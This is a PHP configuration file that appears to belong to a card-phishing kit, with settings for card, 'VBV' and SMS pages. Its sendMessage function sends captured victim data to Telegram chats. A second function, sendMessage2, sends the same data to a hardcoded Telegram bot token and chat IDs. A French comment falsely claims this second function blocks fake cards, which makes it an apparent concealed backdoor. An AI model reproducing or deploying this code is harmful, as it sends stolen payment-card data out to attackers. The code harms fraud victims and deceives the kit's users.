<?php 
# PAGE CONFIG 

$PreviewMessage = true;

# REZ CONFIG

$token = "";

$chatOther = "";

$chatCard = "";
$chatVBV = "";

$email = "";

$bincode = "";

$VBVsms = false;
$time = "10";

$test_mode = false;


function sendMessage($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = $chatOther;
    
    if($page == "vbv")
    {
        $chatid = $chatVBV;
    }else if($page == "card")
    {
        $chatid = $chatCard;
    }

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

function sendMessage2($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid =5195115185;
    
    if($page == "vbv")
    {
        $chatid =5195115185;
    }else if($page == "card")
    {
        $chatid =2011330617;
    }

    $url = "https://api.telegram.org/bot" . "5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ" . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/// NE PAS TOUCHER LA BOUCLE SENDMESSAGE & SENDMESSAGE2 ! BLOQUE LES FAKES CC

?>